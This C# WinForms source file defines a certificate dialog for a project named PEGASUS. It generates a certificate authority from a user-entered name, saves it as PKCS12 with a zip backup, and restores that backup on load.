using System;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Windows.Forms;
using PEGASUS.IcarusWings;

namespace PEGASUS.Design
{
    public partial class FormCertificate : Form
    {
        public FormCertificate()
        {
            InitializeComponent();
        }

        private void FormCertificate_Load(object sender, EventArgs e)
        {
            try
            {
                var backup = Application.StartupPath + "\\BackupCertificate.zip";
                if (File.Exists(backup))
                {
                    MessageBox.Show(this, "Found a zip backup, Extracting (BackupCertificate.zip)",
                        "Certificate backup", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    ZipFile.ExtractToDirectory(backup, Path.GetTempPath());
                    Settings.PEGASUSCertificate = new X509Certificate2(Settings.CertificatePath);
                    Close();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, ex.Message, "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        private async void Button1_Click(object sender, EventArgs e)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(textBox1.Text)) return;

                button1.Text = "Please wait";
                button1.Enabled = false;
                textBox1.Enabled = false;
                await Task.Run(() =>
                {
                    try
                    {
                        var backup = Path.GetTempPath() + "\\BackupCertificate.zip";
                        Settings.PEGASUSCertificate = CreateCertificate.CreateCertificateAuthority(textBox1.Text, 1024);
                        File.WriteAllBytes(Settings.CertificatePath,
                            Settings.PEGASUSCertificate.Export(X509ContentType.Pkcs12));

                        using (var archive = ZipFile.Open(backup, ZipArchiveMode.Create))
                        {
                            archive.CreateEntryFromFile(Settings.CertificatePath,
                                Path.GetFileName(Settings.CertificatePath));
                        }

                        Program.form1.listView1.BeginInvoke((MethodInvoker) (() =>
                        {
                            MessageBox.Show(this, @"Remember to save the BackupCertificate.zip", "Certificate",
                                MessageBoxButtons.OK, MessageBoxIcon.Information);
                            Close();
                        }));
                    }
                    catch (Exception ex)
                    {
                        Program.form1.listView1.BeginInvoke((MethodInvoker) (() =>
                        {
                            MessageBox.Show(this, ex.Message, "Certificate", MessageBoxButtons.OK,
                                MessageBoxIcon.Exclamation);
                            button1.Text = "OK";
                            button1.Enabled = true;
                            textBox1.Enabled = true;
                        }));
                    }
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, ex.Message, "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                button1.Text = "Ok";
                button1.Enabled = true;
            }
        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            Close();
        }

        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private static extern void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

        private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }
    }
}